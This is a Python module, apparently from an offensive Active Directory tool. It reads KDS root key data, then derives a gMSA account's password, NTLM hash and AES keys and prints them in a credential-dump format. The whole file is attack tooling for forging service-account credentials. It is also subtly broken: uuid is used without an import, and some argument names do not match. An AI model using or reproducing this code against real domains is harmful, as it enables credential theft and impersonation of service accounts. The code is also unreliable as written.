import argparse
import base64
import json
import logging
from blastfurnace.lib.dpapi import GmsaSecurityDescriptor as sd
from blastfurnace.lib.dpapi import get_gke_from_cache, KeyCache, KeyIdentifier
from blastfurnace.lib.crypto import calculate_ntlm_hash, calculate_aes_passwd

logger = logging.getLogger(__name__)


def execute_offline(args):

    logger.debug("[-] Offline mode enabled")
    if args.kcache and (args.rkid or args.key or args.kdfparam):
        raise argparse.ArgumentTypeError("Cannot combine kcache with the kds arguments")

    cache = KeyCache()
    if not args.kcache:
        logger.debug("[-] Attempting to build cache from commandline inputs")
        rkid = uuid.UUID(args.rkid)
        cache.load_key(
                root_key_id = rkid,
                key = args.root_key,
                kdf_parameters = args.kdf_param
        )
    else:
        logger.debug(f"[-] Attempting to load kcache from {args.kcache}")
        with open(args.kcache,"r") as f:
            kcache = json.load(f)
        cache = cache.load_cache(kcache)

    logger.debug(f"[-] cache successfully loaded: {cache._root_keys}")

    key_id = KeyIdentifier.unpack(base64.b64decode(args.mpid))
    gke = get_gke_from_cache(key_id.root_key_identifier, sd, cache)

    if gke is None:
        raise Exception("The requested KDS Root Key for the provided managedPasswordID was not found")

    gmsa_passwd = gke.get_gmsa_key(key_id, base64.b64decode(args.sid))
    ntlm = calculate_ntlm_hash(gmsa_passwd, args.sam, key_id.domain_name)
    aes_128,aes_256 = calculate_aes_passwd(gmsa_passwd, args.sam, key_id.domain_name)
    logger.info(f"[+] {args.sam}:NTLM-hash:::{ntlm}")
    logger.info(f"[+] {args.sam}:aes256-cts-hmac-sha1-96:::{aes_256}")
    logger.info(f"[+] {args.sam}:aes128-cts-hmac-sha1-96:::{aes_128}")
    logger.info(f"[+] {args.sam}:gMSA-password:::{base64.b64encode(gmsa_passwd).decode()}")



# managedpasswordid
# sid
# sam name

# rootKeyData
# root key uuid 
# kdf parameters
